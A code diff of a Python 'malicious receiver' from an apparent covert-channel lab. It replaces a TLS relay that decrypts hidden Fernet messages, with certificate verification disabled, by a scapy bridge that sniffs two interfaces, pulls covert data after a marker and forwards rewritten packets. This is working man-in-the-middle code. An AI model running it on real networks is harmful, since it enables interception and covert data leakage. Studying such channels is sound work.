@@ -1,65 +1,60 @@
-import socket, ssl, threading
-from cryptography.fernet import Fernet
+from scapy.all import IP, TCP, Ether, get_if_hwaddr, Raw, sendp, sniff
+
 from config import *
 
-f = Fernet(KEY)
+from utils import print_pkt
 
-# Reuse the same client context for each message
-client_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-client_ctx.check_hostname = False
-client_ctx.verify_mode   = ssl.CERT_NONE
-client_ctx.set_ciphers("ECDHE-RSA-AES256-GCM-SHA384")
+# Configuration
+LEFT_IF = "enp0s3"
+RIGHT_IF = "enp0s8"
 
-def handle_client(client_sock):
-    try:
-        data = client_sock.recv(65535)
+def intercept_packet(pkt):
 
-        # Check if covert marker is present
-        if MARKER in data:
-            # If found, remove it and update original. Print out covert message
-            covert = data.split(MARKER)[1]
-            msg = f.decrypt(covert).decode(errors="ignore")
-            print(f"Malicious Sender: Extracted covert message: {msg}")
+    # skip anything we ourselves sent
+    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[IP].dst == SERVER_IP \
+            and pkt[TCP].dport == SERVER_PORT and pkt[Ether].src != get_if_hwaddr(RIGHT_IF):
+        
+        print("Malicious Receiver: We got a packet for the server")
+        print_pkt(pkt)
 
-            original = data.split(MARKER)[0]
-        else:
-            print("Malicious Sender: No covert message found")
-            original = data
+        pkt = pkt.copy()
 
-        # Connect to legit server using SSLContext
-        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        ssl_sock = client_ctx.wrap_socket(raw, server_hostname=LEGIT_SERVER)
-        ssl_sock.connect((LEGIT_SERVER, LEGIT_PORT))
+        if pkt.haslayer(Raw):
+            data = pkt[Raw].load
+            if MARKER in data:
+                print("We got it!!!")
+                print("covert data:", data.split(MARKER,1)[1])
 
-        # Forward the original record
-        ssl_sock.sendall(original)
-        print("Malicious Sender: Forwarded original TLS record")
+        pkt.src = get_if_hwaddr(RIGHT_IF)
+        pkt.dst = SERVER_MAC
 
-        # Relay back the response so they never know there was another listener
-        response = ssl_sock.recv(65535)
-        ssl_sock.close()
-        client_sock.sendall(response)
-        client_sock.close()
-        print("Malicious Server: Sent response to client")
+        # Remove checksums that have become invalidated by our tampering
+        del pkt[IP].chksum
+        del pkt[TCP].chksum 
 
-    except Exception as e:
-        print(f"Malicious Server: Error: {e}")
+        sendp(pkt, iface=RIGHT_IF, verbose=False)
 
-def start_malicious_receiver():
-    # Server side context (unchanged)
-    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-    context.load_cert_chain(certfile="/certs/server.crt", keyfile="/certs/server.key")
+    elif pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[IP].dst == CLIENT_IP and pkt[Ether].src != get_if_hwaddr(LEFT_IF):
 
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock = context.wrap_socket(sock, server_side=True)
-    sock.bind(("0.0.0.0", TARGET_PORT))
-    sock.listen(5)
+        print("Malicious Receiver: We got a packet for the client")
+        print_pkt(pkt)
 
-    print(f"Malicious Server: Listening on port {TARGET_PORT}...")
-    while True:
-        client, addr = sock.accept()
-        threading.Thread(target=handle_client, args=(client,), daemon=True).start()
+        pkt.src = get_if_hwaddr(LEFT_IF)
+        pkt.dst = SENDER_RIGHT_MAC
+
+        del pkt[IP].chksum
+        del pkt[TCP].chksum 
+
+        sendp(pkt, iface=LEFT_IF, verbose=False)
 
 if __name__ == "__main__":
-    start_malicious_receiver()
+    print("Malicious Receiver: Starting packet sniffer...")
+
+    client_side_mac  = get_if_hwaddr(LEFT_IF)
+    server_side_mac = get_if_hwaddr(RIGHT_IF)
+    bpf_filter = f"not ether src {client_side_mac} and not ether src {server_side_mac}"
+
+    try:
+        sniff(iface=[LEFT_IF, RIGHT_IF], filter=bpf_filter, prn=intercept_packet, store=0)
+    except Exception as e:
+        print(f"Malicious Sender: Error: {e}")
